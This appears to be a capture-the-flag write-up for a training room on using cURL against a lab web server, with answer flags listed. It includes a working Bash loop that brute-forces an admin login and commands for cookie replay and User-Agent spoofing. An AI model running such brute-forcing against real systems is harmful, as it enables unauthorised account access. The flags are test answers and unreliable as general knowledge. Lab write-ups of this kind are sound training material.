# Exploitation with cURL - Hoperation Eggsploit

## Overview
In this room, we faced a situation where we had no graphical interface (GUI), no browser, and no Burp Suite. We had to interact with the Evil Bunnies' web server using only the command line.

We learned how to use **cURL (Client URL)** to send HTTP requests, manage cookies for sessions, spoof User-Agents, and automate brute-force attacks using Bash scripting.

---

## Key Concepts

### HTTP (Hypertext Transfer Protocol)
The language of the web.
* **Request:** The client (browser or cURL) asks the server for a resource.
* **Response:** The server replies with the data (HTML, JSON, etc.) or a status code.


### cURL
A command-line tool for transferring data with URLs. It is the "Swiss Army Knife" of web interaction.
* **GET:** Default mode (retrieves a page).
* **POST (`-X POST`):** Submits data to the server (like logging in).
* **Data (`-d`):** Specifies the parameters to send (e.g., `user=admin`).
* **Cookies (`-c` / `-b`):** Saves and replays session tokens to stay logged in.


### User-Agent Spoofing
Servers often check the "User-Agent" header to identify the client (e.g., Chrome, Firefox, iPhone). Attackers change this string to bypass restrictions or pretend to be a legitimate device.

---

## Technical Investigation

### Task 1: Sending POST Requests
We needed to simulate a login form submission to the endpoint `/post.php`.
**Command:**
```bash
curl -X POST -d "username=admin&password=admin&submit=Login" http://10.80.129.40/post.php
```
* `-X POST`: Tells cURL to use the POST method.
* `-d`: Sends the data `username=admin` and `password=admin`.
**Result:** `THM{curl_post_success}`

### Task 2: Handling Cookies (Sessions)
Websites use cookies to remember who you are. With cURL, we have to handle them manually.

**Step 1: Log in and save the cookie**
```bash
curl -c cookies.txt -d "username=admin&password=admin" http://10.80.129.40/cookie.php
```
* `-c cookies.txt`: Saves the "Set-Cookie" header from the server into a text file.

### Step 2: Reuse the cookie to access the page
**Command:**
```bash
curl -b cookies.txt http://10.80.129.40/cookie.php
```
* `-b cookies.txt`: Sends the cookie back to the server to prove we are authenticated.

**Result:** `THM{session_cookie_master}`

### Task 3: Brute-Forcing via Bash
We needed to find the admin password by trying a list of common passwords against `/bruteforce.php`. 

**Script (`loop.sh`):**
```bash
#!/bin/bash
# Create the password list
echo "admin123" > passwords.txt
echo "password" >> passwords.txt
echo "letmein" >> passwords.txt
echo "secretpass" >> passwords.txt
echo "secret" >> passwords.txt

# Loop through the list
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.80.129.40/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```
**Result:** The script identified the password as `secretpass`.

### Task 4: Bypassing User-Agent Filters
The server at `/agent.php` was blocking standard cURL requests. We had to pretend to be a specific agent named "TBFC".

**Command:**
```bash
curl -A "TBFC" http://10.80.129.40/agent.php
```
* `-A "TBFC"`: Changes the User-Agent header string.

**Result:** `THM{user_agent_filter_bypassed}`
---

## Answers Summary

| Question | Answer |
| :--- | :--- |
| Make a POST request to `/post.php` with `admin:admin`. Flag? | `THM{curl_post_success}` |
| Make a request to `/cookie.php`, save cookie, reuse it. Flag? | `THM{session_cookie_master}` |
| What is the password of the `admin` user after brute forcing? | `secretpass` |
| Make a request to `/agent.php` with user-agent `TBFC`. Flag? | `THM{user_agent_filter_bypassed}` |

---

## Lessons Learned
* **GUI is optional:** A security professional must be comfortable working without a browser. cURL is faster and more precise for testing APIs.
* **State Management:** HTTP is stateless. Cookies are the only thing linking your requests together. If you can steal a cookie, you can steal a session.
* **Scripting is Power:** Being able to write a 3-line Bash loop can replace complex tools like Hydra for simple tasks.

---
> **Key Takeaway**: Understanding raw HTTP requests allows you to bypass restrictions, automate attacks, and interact with servers even when you don't have a visual interface.
